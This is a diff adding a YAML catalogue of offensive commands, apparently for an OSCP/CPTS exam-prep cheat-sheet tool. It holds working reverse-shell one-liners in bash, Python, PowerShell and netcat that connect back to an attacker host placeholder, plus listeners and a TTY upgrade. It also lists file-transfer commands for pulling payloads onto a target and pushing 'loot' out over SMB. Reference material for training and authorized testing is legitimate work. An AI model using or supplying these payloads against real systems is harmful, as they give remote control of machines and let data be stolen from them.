@@ -1,0 +1,141 @@
+category: "shells-transfer"
+description: "Reverse shells, bind shells, and file transfer techniques"
+commands:
+  - name: "revshell-bash"
+    description: "Bash reverse shell"
+    command: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
+    tool: "bash"
+    tags: ["shell", "reverse", "bash", "linux"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "revshell-python"
+    description: "Python reverse shell"
+    command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    tool: "python"
+    tags: ["shell", "reverse", "python", "linux"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "revshell-powershell"
+    description: "PowerShell reverse shell (Base64-safe)"
+    command: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""
+    tool: "powershell"
+    tags: ["shell", "reverse", "powershell", "windows"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "revshell-nc"
+    description: "Netcat reverse shell"
+    command: "nc -e /bin/bash {LHOST} {LPORT}"
+    tool: "nc"
+    tags: ["shell", "reverse", "netcat"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "If -e not available: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+
+  - name: "listener-nc"
+    description: "Netcat listener for reverse shell"
+    command: "nc -lvnp {LPORT}"
+    tool: "nc"
+    tags: ["shell", "listener"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "listener-rlwrap"
+    description: "Better reverse shell listener with rlwrap"
+    command: "rlwrap nc -lvnp {LPORT}"
+    tool: "rlwrap"
+    tags: ["shell", "listener"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "rlwrap adds readline support (arrow keys, history)"
+
+  - name: "shell-upgrade-python"
+    description: "Upgrade dumb shell to interactive TTY"
+    command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; # then: CTRL+Z, stty raw -echo; fg"
+    tool: "python"
+    tags: ["shell", "upgrade", "tty"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "After spawning: Ctrl+Z, 'stty raw -echo; fg', then 'export TERM=xterm'"
+
+  - name: "transfer-python-server"
+    description: "Start Python HTTP server for file transfer"
+    command: "python3 -m http.server 80"
+    tool: "python"
+    tags: ["transfer", "http", "server"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "transfer-wget"
+    description: "Download file with wget"
+    command: "wget http://{LHOST}/file -O /tmp/file"
+    tool: "wget"
+    tags: ["transfer", "download", "linux"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "transfer-curl"
+    description: "Download file with curl"
+    command: "curl http://{LHOST}/file -o /tmp/file"
+    tool: "curl"
+    tags: ["transfer", "download", "linux"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "transfer-certutil"
+    description: "Download file with certutil (Windows)"
+    command: "certutil -urlcache -split -f http://{LHOST}/file.exe C:\\Windows\\Temp\\file.exe"
+    tool: "certutil"
+    tags: ["transfer", "download", "windows", "lolbas"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "transfer-powershell-download"
+    description: "PowerShell file download"
+    command: "powershell -c \"Invoke-WebRequest -Uri http://{LHOST}/file.exe -OutFile C:\\Windows\\Temp\\file.exe\""
+    tool: "powershell"
+    tags: ["transfer", "download", "powershell", "windows"]
+    os: "windows"
+
+  - name: "transfer-smb-download"
+    description: "Download via SMB (from Impacket SMBServer)"
+    command: "copy \\\\{LHOST}\\share\\file.exe C:\\Windows\\Temp\\file.exe"
+    tool: "cmd"
+    tags: ["transfer", "smb", "windows", "download"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "transfer-smb-upload"
+    description: "Upload via SMB (to Impacket SMBServer)"
+    command: "copy C:\\Windows\\Temp\\loot.txt \\\\{LHOST}\\share\\loot.txt"
+    tool: "cmd"
+    tags: ["transfer", "smb", "windows", "upload"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "transfer-scp-upload"
+    description: "Secure copy upload (ssh)"
+    command: "scp -P 22 file.txt {USER}@{IP}:/tmp/file.txt"
+    tool: "scp"
+    tags: ["transfer", "scp", "ssh", "upload"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "transfer-scp"
+    description: "SCP file transfer"
+    command: "scp file.txt {USER}@{IP}:/tmp/"
+    tool: "scp"
+    tags: ["transfer", "scp"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "transfer-smb-server"
+    description: "Start Impacket SMB server for Windows file transfer"
+    command: "impacket-smbserver share . -smb2support"
+    tool: "impacket"
+    tags: ["transfer", "smb", "server", "windows"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "On Windows target: copy \\\\{LHOST}\\share\\file.exe C:\\Temp\\"
